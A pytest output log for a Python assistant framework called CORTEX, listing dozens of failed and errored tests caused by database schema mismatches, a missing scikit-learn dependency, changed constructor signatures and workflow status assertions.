assert ('\u2588\u2588' in '![CORTEX Commands](file:///d:/PROJECTS/CORTEX/docs/images/cortex-help-banner.png)\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  CORTEX COMMANDS\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n\U0001f4dd **Your Request:** {{user_request}}\n\n\U0001f3af **Understanding:** You want to see all available CORTEX commands\n\n\U0001f4ac **Response:** Here\'s your command reference:\n\nStatus  Command        What It Does\n--------------------------------------------------------------------------------\n\u2705      update story   Refresh CORTEX story documentation\n\U0001f504      setup          Setup/configure environment\n\u2705      design sync    Synchronize design with implementation\n\U0001f504      cleanup        Clean temporary files\n\u23f8\ufe0f      build docs     Generate documentation\n\u23f8\ufe0f      check brain    Validate brain protection\n\u23f8\ufe0f      run tests      Execute test suite\n\U0001f3af      plan this      Interactive planning (CORTEX 2.1)\n--------------------------------------------------------------------------------\n\nLegend:\n  \u2705 ready    - Fully working\n  \U0001f504 partial  - Core working, some modules pending\n  \u23f8\ufe0f pending  - Architecture ready, implementation pending\n  \U0001f3af planned  - Design phase (CORTEX 2.1+)\n\nUsage:\n  Natural language:  "setup environment" or "refresh story" or "sync design"\n  Slash commands:    /setup or /CORTEX, refresh cortex story\n\n\ufffd **Next Steps:**\n  \u2022 Try: "help detailed" for more information\n  \u2022 Try: "help <command>" for specific command help\n  \u2022 Try: "setup environment" to get started\n\n\xa9 2024-2025 Asif Hussain \u2502 Proprietary \u2502 github.com/asifhussain60/CORTEX\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n' or '\u2554' in '![CORTEX Commands](file:///d:/PROJECTS/CORTEX/docs/images/cortex-help-banner.png)\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  CORTEX COMMANDS\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n\U0001f4dd **Your Request:** {{user_request}}\n\n\U0001f3af **Understanding:** You want to see all available CORTEX commands\n\n\U0001f4ac **Response:** Here\'s your command reference:\n\nStatus  Command        What It Does\n--------------------------------------------------------------------------------\n\u2705      update story   Refresh CORTEX story documentation\n\U0001f504      setup          Setup/configure environment\n\u2705      design sync    Synchronize design with implementation\n\U0001f504      cleanup        Clean temporary files\n\u23f8\ufe0f      build docs     Generate documentation\n\u23f8\ufe0f      check brain    Validate brain protection\n\u23f8\ufe0f      run tests      Execute test suite\n\U0001f3af      plan this      Interactive planning (CORTEX 2.1)\n--------------------------------------------------------------------------------\n\nLegend:\n  \u2705 ready    - Fully working\n  \U0001f504 partial  - Core working, some modules pending\n  \u23f8\ufe0f pending  - Architecture ready, implementation pending\n  \U0001f3af planned  - Design phase (CORTEX 2.1+)\n\nUsage:\n  Natural language:  "setup environment" or "refresh story" or "sync design"\n  Slash commands:    /setup or /CORTEX, refresh cortex story\n\n\ufffd **Next Steps:**\n  \u2022 Try: "help detailed" for more information\n  \u2022 Try: "help <command>" for specific command help\n  \u2022 Try: "setup environment" to get started\n\n\xa9 2024-2025 Asif Hussain \u2502 Proprietary \u2502 github.com/asifhussain60/CORTEX\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n')
FAILED tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_file_entities - sqlite3.IntegrityError: NOT NULL constraint failed: entities.conversation_id
FAILED tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_class_entities - sqlite3.IntegrityError: NOT NULL constraint failed: entities.conversation_id
FAILED tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_method_entities - sqlite3.IntegrityError: NOT NULL constraint failed: entities.conversation_id
FAILED tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_multiple_entity_types - sqlite3.IntegrityError: NOT NULL constraint failed: entities.conversation_id
FAILED tests/tier1/entities/test_entity_extractor.py::TestGetConversationEntities::test_get_entities_after_extraction - sqlite3.OperationalError: no such table: conversation_entities
FAILED tests/tier1/entities/test_entity_extractor.py::TestGetConversationEntities::test_get_entities_empty_conversation - sqlite3.OperationalError: no such table: conversation_entities
FAILED tests/tier1/entities/test_entity_extractor.py::TestGetEntityStatistics::test_get_statistics_includes_access_count - sqlite3.OperationalError: no such table: conversation_entities
FAILED tests/tier1/entities/test_entity_extractor.py::TestGetEntityStatistics::test_get_statistics_empty_database - sqlite3.OperationalError: no such table: conversation_entities
FAILED tests/tier1/fifo/test_queue_manager.py::TestEnforceFifoLimit::test_no_eviction_under_limit - KeyError: 'total_conversations'
FAILED tests/tier1/fifo/test_queue_manager.py::TestEnforceFifoLimit::test_evicts_oldest_when_at_capacity - AssertionError: assert Conversation(conversation_id='conv-0', title='Conv 0', created_at=datetime.datetime(2025, 11, 11, 12, 43, 38, 307525), updated_at=datetime.datetime(2025, 11, 11, 12, 43, 38, 307525), message_count=0, is_active=True, summary=None, tags=None) is None
FAILED tests/tier1/fifo/test_queue_manager.py::TestEnforceFifoLimit::test_never_evicts_active_conversation - sqlite3.OperationalError: no such table: messages
FAILED tests/tier1/fifo/test_queue_manager.py::TestEnforceFifoLimit::test_eviction_logs_event - assert 0 >= 1
 +  where 0 = len([])
FAILED tests/tier1/fifo/test_queue_manager.py::TestGetQueueStatus::test_status_shows_correct_counts - KeyError: 'total_conversations'
FAILED tests/tier1/fifo/test_queue_manager.py::TestGetQueueStatus::test_status_empty_database - KeyError: 'total_conversations'
FAILED tests/tier1/messages/test_message_store.py::TestAddMessages::test_add_single_message - sqlite3.OperationalError: no such column: timestamp
FAILED tests/tier1/messages/test_message_store.py::TestAddMessages::test_add_multiple_messages - sqlite3.OperationalError: no such column: timestamp
FAILED tests/tier1/messages/test_message_store.py::TestAddMessages::test_add_messages_to_different_conversations - sqlite3.OperationalError: no such column: timestamp
FAILED tests/tier1/messages/test_message_store.py::TestGetMessages::test_get_messages_preserves_order - sqlite3.OperationalError: no such column: timestamp
FAILED tests/tier1/messages/test_message_store.py::TestGetMessages::test_get_messages_empty_conversation - sqlite3.OperationalError: no such column: timestamp
FAILED tests/tier1/messages/test_message_store.py::TestGetMessages::test_get_messages_includes_all_fields - sqlite3.OperationalError: no such column: timestamp
FAILED tests/tier1/messages/test_message_store.py::TestDeleteMessages::test_delete_removes_all_messages - sqlite3.OperationalError: no such column: timestamp
FAILED tests/tier1/test_vision_api.py::TestTokenEstimation::test_estimate_tokens_for_small_image - assert 0 > 0
FAILED tests/tier1/test_vision_api.py::TestTokenEstimation::test_estimate_tokens_without_pil - assert 0 > 0
FAILED tests/tier1/test_vision_api.py::TestBudgetEnforcement::test_reject_image_exceeding_budget - assert True is False
FAILED tests/tier1/test_vision_api.py::TestMetrics::test_metrics_collection - assert 0 >= 1
FAILED tests/tier1/test_vision_api_auto_engagement.py::TestVisionAPIAutoEngagement::test_vision_api_auto_engagement_end_to_end - AssertionError: Analysis missing color detection
assert ('purple' in '{\'elements\': [{\'type\': \'button\', \'label\': \'action\', \'suggested_id\': \'btn-action\', \'selector\': \'button\', \'position\': {\'x\': 100, \'y\': 100}}], \'element_count\': 1, \'recommendations\': [\'ensure buttons have clear action labels\', "use playwright\'s getbyrole() for robust selectors", \'consider getbylabel() for form inputs\'], \'analysis_type\': \'basic\'}' or '#7c3aed' in '{\'elements\': [{\'type\': \'button\', \'label\': \'action\', \'suggested_id\': \'btn-action\', \'selector\': \'button\', \'position\': {\'x\': 100, \'y\': 100}}], \'element_count\': 1, \'recommendations\': [\'ensure buttons have clear action labels\', "use playwright\'s getbyrole() for robust selectors", \'consider getbylabel() for form inputs\'], \'analysis_type\': \'basic\'}')
FAILED tests/tier1/test_working_memory_optimization.py::TestContextOptimization::test_get_optimized_context_with_active_conversation - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier1/test_working_memory_optimization.py::TestContextOptimization::test_get_optimized_context_with_specific_conversation - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier1/test_working_memory_optimization.py::TestContextOptimization::test_get_optimized_context_with_pattern_context - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier1/test_working_memory_optimization.py::TestContextOptimization::test_get_optimized_context_with_custom_target_reduction - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier1/test_working_memory_optimization.py::TestContextOptimization::test_build_context_with_no_conversations - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier1/test_working_memory_optimization.py::TestCacheHealthIntegration::test_cache_health_check_on_context_retrieval - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier1/test_working_memory_optimization.py::TestTokenMetricsIntegration::test_metrics_recorded_on_optimization - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier1/test_working_memory_optimization.py::TestTokenMetricsIntegration::test_get_token_metrics_summary - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier1/test_working_memory_optimization.py::TestPerformanceTargets::test_optimization_overhead_under_50ms - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier1/test_working_memory_optimization.py::TestPerformanceTargets::test_optimization_overhead_multiple_conversations - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier1/test_working_memory_optimization.py::TestQualityTargets::test_quality_score_above_threshold - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier1/test_working_memory_optimization.py::TestQualityTargets::test_quality_maintained_with_high_reduction - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier1/test_working_memory_optimization.py::TestTokenEstimation::test_estimate_tokens_with_complex_context - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier1/test_working_memory_optimization.py::TestEdgeCases::test_optimization_with_empty_conversation - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier1/test_working_memory_optimization.py::TestEdgeCases::test_optimization_with_none_conversation_id - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier1/test_working_memory_optimization.py::TestEdgeCases::test_optimization_with_invalid_target_reduction - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
FAILED tests/tier2/knowledge_graph/test_database.py::TestDatabasePerformance::test_connection_establishment_is_fast - AssertionError: Connection should be <10ms, got 121.44ms
assert 121.4442253112793 < 10
FAILED tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_node_modules - AssertionError: assert False
 +  where False = is_noise_file(WindowsPath('C:/WINDOWS/TEMP/tmp9px_pe5l/node_modules/package/index.js'))
 +    where is_noise_file = <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24F1EDD10>.is_noise_file
 +      where <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24F1EDD10> = <tests.tier2.test_smart_filter.TestSmartFileFilter object at 0x000001E24E5CDE00>.filter
FAILED tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_dist_build - AssertionError: assert False
 +  where False = is_noise_file(WindowsPath('C:/WINDOWS/TEMP/tmp0_162urc/dist/bundle.js'))
 +    where is_noise_file = <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24EABA9E0>.is_noise_file
 +      where <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24EABA9E0> = <tests.tier2.test_smart_filter.TestSmartFileFilter object at 0x000001E24E5CDF30>.filter
FAILED tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_generated_directory - AssertionError: assert False
 +  where False = is_noise_file(WindowsPath('C:/WINDOWS/TEMP/tmpmru70fpa/generated/output.py'))
 +    where is_noise_file = <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24F2A9C50>.is_noise_file
 +      where <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24F2A9C50> = <tests.tier2.test_smart_filter.TestSmartFileFilter object at 0x000001E24E5A4F50>.filter
FAILED tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_git_directory - AssertionError: assert False
 +  where False = is_noise_file(WindowsPath('C:/WINDOWS/TEMP/tmpb2da2n6p/.git/objects/abc123'))
 +    where is_noise_file = <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24ED31F40>.is_noise_file
 +      where <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24ED31F40> = <tests.tier2.test_smart_filter.TestSmartFileFilter object at 0x000001E24E5A58B0>.filter
FAILED tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_vscode_files - AssertionError: assert False
 +  where False = is_noise_file(WindowsPath('C:/WINDOWS/TEMP/tmp_1b9a_2r/.vscode/settings.json'))
 +    where is_noise_file = <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24EBC0500>.is_noise_file
 +      where <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24EBC0500> = <tests.tier2.test_smart_filter.TestSmartFileFilter object at 0x000001E24E60DFD0>.filter
FAILED tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_idea_files - AssertionError: assert False
 +  where False = is_noise_file(WindowsPath('C:/WINDOWS/TEMP/tmp99uwry8x/.idea/workspace.xml'))
 +    where is_noise_file = <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24EB7D470>.is_noise_file
 +      where <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24EB7D470> = <tests.tier2.test_smart_filter.TestSmartFileFilter object at 0x000001E24E518050>.filter
FAILED tests/tier3/analysis/test_insight_generator.py::TestInsight::test_insight_creation - TypeError: Insight.__init__() got an unexpected keyword argument 'data'
FAILED tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_analyzer_initialization - AttributeError: 'VelocityAnalyzer' object has no attribute 'store'
FAILED tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_calculate_velocity_with_data - TypeError: VelocityAnalyzer.calculate_velocity() got an unexpected keyword argument 'days'
FAILED tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_calculate_velocity_empty_data - TypeError: VelocityAnalyzer.calculate_velocity() got an unexpected keyword argument 'days'
FAILED tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_analyze_trends_with_data - AttributeError: 'VelocityAnalyzer' object has no attribute 'analyze_trends'
FAILED tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_velocity_calculation_accuracy - AttributeError: 'VelocityAnalyzer' object has no attribute 'store'
FAILED tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_trend_direction_increasing - AttributeError: 'VelocityAnalyzer' object has no attribute 'store'
FAILED tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_date_range_filtering - TypeError: VelocityAnalyzer.calculate_velocity() got an unexpected keyword argument 'days'
FAILED tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_velocity_with_zero_days - TypeError: VelocityAnalyzer.calculate_velocity() got an unexpected keyword argument 'days'
FAILED tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_empty_repository_handling - TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
FAILED tests/workflows/test_workflow_engine.py::TestWorkflowOrchestrator::test_execute_workflow_with_required_stage_failure - AssertionError: assert <StageStatus.RUNNING: 'running'> == <StageStatus.FAILED: 'failed'>
 +  where <StageStatus.FAILED: 'failed'> = StageStatus.FAILED
FAILED tests/workflows/test_workflow_engine.py::TestWorkflowOrchestrator::test_execute_workflow_with_optional_stage_failure - AssertionError: assert <StageStatus.RUNNING: 'running'> == <StageStatus.FAILED: 'failed'>
 +  where <StageStatus.FAILED: 'failed'> = StageStatus.FAILED
FAILED tests/workflows/test_workflow_engine.py::TestWorkflowOrchestrator::test_checkpoint_and_resume - AssertionError: assert <StageStatus.RUNNING: 'running'> == <StageStatus.FAILED: 'failed'>
 +  where <StageStatus.FAILED: 'failed'> = StageStatus.FAILED
FAILED tests/workflows/test_workflow_integration.py::TestFeatureDevelopmentWorkflow::test_feature_development_happy_path - assert False
 +  where False = all(<generator object TestFeatureDevelopmentWorkflow.test_feature_development_happy_path.<locals>.<genexpr> at 0x000001E24EBCF920>)
FAILED tests/workflows/test_workflow_integration.py::TestFeatureDevelopmentWorkflow::test_feature_development_checkpoint_resume - KeyError: 'test'
FAILED tests/workflows/test_workflow_integration.py::TestFeatureDevelopmentWorkflow::test_feature_development_required_stage_failure - KeyError: 'implement'
FAILED tests/workflows/test_workflow_integration.py::TestBugFixWorkflow::test_bug_fix_required_stage_failure - AssertionError: assert <StageStatus.RUNNING: 'running'> == <StageStatus.FAILED: 'failed'>
 +  where <StageStatus.FAILED: 'failed'> = StageStatus.FAILED
FAILED tests/workflows/test_workflow_integration.py::TestRefactoringWorkflow::test_refactoring_required_stage_failure - AssertionError: assert <StageStatus.RUNNING: 'running'> == <StageStatus.FAILED: 'failed'>
 +  where <StageStatus.FAILED: 'failed'> = StageStatus.FAILED
FAILED tests/workflows/test_workflow_integration.py::TestSecurityEnhancementWorkflow::test_security_required_stage_failure - AssertionError: assert <StageStatus.RUNNING: 'running'> == <StageStatus.FAILED: 'failed'>
 +  where <StageStatus.FAILED: 'failed'> = StageStatus.FAILED
ERROR tests/integration/test_agent_coordination.py::TestMultiAgentWorkflow::test_feature_development_full_pipeline - TypeError: IntentRouter.__init__() got an unexpected keyword argument 'brain_root'
ERROR tests/integration/test_agent_coordination.py::TestMultiAgentWorkflow::test_architecture_planning_workflow - TypeError: IntentRouter.__init__() got an unexpected keyword argument 'brain_root'
ERROR tests/integration/test_error_recovery.py::TestSKULLProtectionLayer::test_skull_001_blocks_untested_changes - TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
ERROR tests/integration/test_error_recovery.py::TestSKULLProtectionLayer::test_skull_001_allows_tested_changes - TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
ERROR tests/integration/test_error_recovery.py::TestSKULLProtectionLayer::test_skull_002_blocks_untested_integrations - TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
ERROR tests/integration/test_error_recovery.py::TestSKULLProtectionLayer::test_skull_003_warns_on_css_changes - TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
ERROR tests/integration/test_error_recovery.py::TestSKULLProtectionLayer::test_skull_004_warns_on_immediate_retry - TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
ERROR tests/integration/test_error_recovery.py::TestBrainTierProtection::test_tier0_immutability_enforced - TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
ERROR tests/integration/test_error_recovery.py::TestBrainTierProtection::test_tier1_schema_validation - TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
ERROR tests/integration/test_error_recovery.py::TestBrainTierProtection::test_tier1_retention_limit_enforced - TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
ERROR tests/integration/test_error_recovery.py::TestBrainTierProtection::test_tier2_yaml_validation - TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
ERROR tests/integration/test_error_recovery.py::TestBrainTierProtection::test_tier3_read_only_enforcement - TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
ERROR tests/integration/test_error_recovery.py::TestValidationRules::test_hardcoded_credentials_blocked - TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
ERROR tests/integration/test_error_recovery.py::TestValidationRules::test_low_coverage_warning - TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizeCortexOrchestrator::test_metadata - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizeCortexOrchestrator::test_validate_prerequisites_success - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizeCortexOrchestrator::test_validate_prerequisites_missing_git - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizeCortexOrchestrator::test_validate_prerequisites_missing_tests - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizeCortexOrchestrator::test_validate_prerequisites_missing_knowledge_graph - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestSKULLTests::test_run_skull_tests_success - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestSKULLTests::test_run_skull_tests_failure - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestSKULLTests::test_run_skull_tests_timeout - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestArchitectureAnalysis::test_analyze_knowledge_graph - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestArchitectureAnalysis::test_analyze_operations - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestArchitectureAnalysis::test_analyze_brain_protection - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizationPlan::test_generate_plan_with_issues - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizationPlan::test_generate_plan_with_high_frequency_patterns - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizationExecution::test_execute_optimizations - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizationExecution::test_execute_optimizations_with_failures - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestGitOperations::test_git_commit_success - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestGitOperations::test_git_commit_no_changes - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestIntegration::test_full_optimization_workflow - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/operations/test_optimize_cortex_orchestrator.py::TestMetrics::test_generate_optimization_report - TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
ERROR tests/plugins/test_command_expansion.py::TestRouterCommandExpansion::test_slash_command_expanded_before_routing - ImportError: attempted relative import with no known parent package
ERROR tests/plugins/test_command_expansion.py::TestRouterCommandExpansion::test_natural_language_passes_through - ImportError: attempted relative import with no known parent package
ERROR tests/plugins/test_command_expansion.py::TestRouterCommandExpansion::test_unknown_slash_command_passes_through - ImportError: attempted relative import with no known parent package
ERROR tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_plugin_initialization - TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
ERROR tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_discover_mode - TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
ERROR tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_discover_oracle_from_code - TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
ERROR tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_discover_apis_from_code - TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
ERROR tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_discover_from_environment - TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
ERROR tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_discover_apis_from_environment - TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
ERROR tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_parse_tnsnames - TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
ERROR tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_save_to_config - TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
ERROR tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_discover_openapi_specs - TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
ERROR tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_validate_api_connection - TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
ERROR tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_non_interactive_mode - TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
ERROR tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_extract_namespace_from_dsn - TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
ERROR tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_discover_all_integration - TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
ERROR tests/test_risk_mitigation.py::TestContextInjectionPerformance::test_context_injection_under_200ms
ERROR tests/test_risk_mitigation.py::TestContextInjectionPerformance::test_fts5_search_under_100ms
